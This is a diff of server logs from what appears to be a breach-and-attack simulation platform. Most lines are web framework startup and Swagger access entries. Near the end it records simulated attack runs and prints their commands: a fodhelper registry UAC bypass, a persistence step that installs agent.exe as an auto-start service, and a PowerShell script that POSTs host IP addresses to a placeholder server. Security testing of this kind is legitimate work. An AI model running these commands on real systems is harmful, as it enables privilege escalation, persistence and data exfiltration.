@@ -8235,3 +8235,133 @@ client uuid : 09a4e53c7a1c4b4e9a519f36df29d8a2
 client uuid : 09a4e53c7a1c4b4e9a519f36df29d8a2
 client uuid : 09a4e53c7a1c4b4e9a519f36df29d8a2
 client uuid : 09a4e53c7a1c4b4e9a519f36df29d8a2
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	16
+INFO Prefork: 			Disabled
+INFO PID: 			4114696
+INFO Total process count: 	TCP server listening on port 8080
+1
+
+signal: interrupt
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+TCP server listening on port 8080
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	16
+INFO Prefork: 			Disabled
+INFO PID: 			4115333
+INFO Total process count: 	1
+
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+[GIN] 2024/10/03 - 06:33:55 | 200 |     353.751µs |  223.195.37.233 | GET      "/swagger/index.html"
+[GIN] 2024/10/03 - 06:33:55 | 200 |    9.431343ms |  223.195.37.233 | GET      "/swagger/swagger-ui.css"
+[GIN] 2024/10/03 - 06:33:55 | 200 |   19.198557ms |  223.195.37.233 | GET      "/swagger/swagger-ui-standalone-preset.js"
+[GIN] 2024/10/03 - 06:33:56 | 200 |   78.148326ms |  223.195.37.233 | GET      "/swagger/swagger-ui-bundle.js"
+[GIN] 2024/10/03 - 06:33:56 | 200 |     108.395µs |  223.195.37.233 | GET      "/swagger/favicon-32x32.png"
+[GIN] 2024/10/03 - 06:33:56 | 200 |     374.144µs |  223.195.37.233 | GET      "/swagger/doc.json"
+Invalid Command
+Invalid Command
+Invalid Command
+Error reading from connection: EOF
+Invalid Command
+Invalid Command
+Invalid Command
+Error reading from connection: EOF
+[GIN] 2024/10/03 - 09:27:34 | 200 |     124.947µs |   218.146.20.61 | GET      "/swagger/index.html"
+[GIN] 2024/10/03 - 09:27:35 | 200 |   41.126475ms |   218.146.20.61 | GET      "/swagger/swagger-ui.css"
+[GIN] 2024/10/03 - 09:27:35 | 200 |  731.099785ms |   218.146.20.61 | GET      "/swagger/swagger-ui-standalone-preset.js"
+[GIN] 2024/10/03 - 09:27:37 | 200 |  2.246153232s |   218.146.20.61 | GET      "/swagger/swagger-ui-bundle.js"
+[GIN] 2024/10/03 - 09:27:37 | 200 |     356.334µs |   218.146.20.61 | GET      "/swagger/doc.json"
+Invalid Command
+[GIN] 2024/10/03 - 10:02:19 | 200 |     193.463µs |    27.0.238.116 | GET      "/swagger/index.html"
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+ApplicationDB logging
+23291ba928c74d958510765842a3665f
+&{0 P_PrivilegeEscalation_0001 23291ba928c74d958510765842a3665f 00edd2e0a65b4deb8b93234ba09b019d  2024-10-03 14:16:14.671645315 +0900 KST m=+27744.997911670}
+&{0 P_Persistence_0001 23291ba928c74d958510765842a3665f f85f7f1ab5914e3e913dc5689ebe0833  2024-10-03 14:16:14.738030458 +0900 KST m=+27745.064296394}
+&{0 P_Discovery_0001 23291ba928c74d958510765842a3665f fe1680530f7240ec8b63214dcc387483  2024-10-03 14:16:14.785595385 +0900 KST m=+27745.111861321}
+&{0 P_CommandAndControl_0004 23291ba928c74d958510765842a3665f 49601fd37afe4ef6aa8433035fd7fdb0  2024-10-03 14:16:14.834624272 +0900 KST m=+27745.160890139}
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_PrivilegeEscalation_0001  2024-10-03 14:16:34.7769929 +0900 KST 1 
+
+    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open
+
+
+Name                           Property                                                                           
+----                           --------                                                                           
+command                                                                                                           
+
+
+ New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(default)' -Value 'cmd.exe /c start '#'{agent.exe}'; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value ''; Start-Process "fodhelper.exe"}
+Inserted document with ID: ObjectID("66fe28b2a98a0b5a50bdc865")
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Persistence_0001  2024-10-03 14:16:40.3296487 +0900 KST -1  copy "#{C:\Path\To\agent.exe}" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fe28b8a98a0b5a50bdc867")
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Discovery_0001  2024-10-03 14:17:03.422216 +0900 KST -1  $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP }; Invoke-RestMethod -Uri "#{http://server/ipinfo}" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null}
+Inserted document with ID: ObjectID("66fe28cfa98a0b5a50bdc869")
+&{0 P_PrivilegeEscalation_0001 23291ba928c74d958510765842a3665f bd5b25f50ace4f9ebff52f8c11834ba0  2024-10-03 14:18:56.473471287 +0900 KST m=+27906.799737154}
+&{0 P_Persistence_0001 23291ba928c74d958510765842a3665f ee2cdeb465154e08a80d5fdbdfe13e39  2024-10-03 14:18:56.529967938 +0900 KST m=+27906.856233316}
+&{0 P_Discovery_0001 23291ba928c74d958510765842a3665f 06126e098b294a8ea3bb2235a726cffc  2024-10-03 14:18:56.584095825 +0900 KST m=+27906.910361273}
+&{0 P_CommandAndControl_0004 23291ba928c74d958510765842a3665f aa05983064e54336b2764537625d4a88  2024-10-03 14:18:56.639574318 +0900 KST m=+27906.965840184}
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_PrivilegeEscalation_0001  2024-10-03 14:19:03.5113539 +0900 KST 1 
+
+    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open
+
+
+Name                           Property                                                                           
+----                           --------                                                                           
+command                                                                                                           
+
+
+ New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(default)' -Value 'cmd.exe /c start '#'{agent.exe}'; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value ''; Start-Process "fodhelper.exe"}
+Inserted document with ID: ObjectID("66fe2947a98a0b5a50bdc86b")
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Persistence_0001  2024-10-03 14:19:08.4418097 +0900 KST -1  copy "#{C:\Path\To\agent.exe}" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fe294ca98a0b5a50bdc86d")
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Discovery_0001  2024-10-03 14:19:16.7649942 +0900 KST -1  $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP }; Invoke-RestMethod -Uri "#{http://server/ipinfo}" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null}
+Inserted document with ID: ObjectID("66fe2954a98a0b5a50bdc86f")
+Invalid Command
+[GIN] 2024/10/03 - 16:14:44 | 304 |      88.071µs |  223.195.37.233 | GET      "/swagger/swagger-ui-bundle.js"
+[GIN] 2024/10/03 - 16:14:44 | 304 |     157.913µs |  223.195.37.233 | GET      "/swagger/swagger-ui.css"
+[GIN] 2024/10/03 - 16:14:44 | 304 |      46.934µs |  223.195.37.233 | GET      "/swagger/swagger-ui-standalone-preset.js"
+[GIN] 2024/10/03 - 16:14:44 | 304 |      47.981µs |  223.195.37.233 | GET      "/swagger/favicon-32x32.png"
+[GIN] 2024/10/03 - 16:14:44 | 200 |     286.702µs |  223.195.37.233 | GET      "/swagger/doc.json"
+signal: terminated
